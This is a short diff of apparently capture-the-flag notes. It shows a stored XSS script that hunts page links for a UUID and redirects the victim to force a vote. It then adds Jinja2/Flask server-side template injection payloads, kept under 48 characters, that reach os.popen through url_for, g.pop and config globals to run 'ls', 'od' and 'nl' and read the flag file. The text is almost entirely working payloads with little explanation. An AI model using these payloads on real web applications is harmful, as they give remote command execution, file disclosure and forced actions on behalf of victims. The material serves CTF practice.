@@ -33,3 +33,16 @@ go();
 ```
 reamb<script>let uuid; for (let a of document.querySelectorAll("a")) { if(a.textContent.includes('reamb')) uuid = a.href.split('/')[4] }; location.href = '/vote/' + uuid</script>
 ```
+
+2. ssti web
+> payload should be no longer than 48 chars. 
+ sample payloads. 
+http://localhost/ssti?query={{g.__class__.__base__.__subclasses__()[92]}}
+
+url_for.__globals__.os.popen("ls").read()
+{{url_for.__globals__.os.popen("od t*").read()}}
+g.pop.__globals__.os.popen("od f*").read()   # reading flag
+config.__init__.__globals__.os.popen("nl * | od -b").read()
+
+
+ 3.
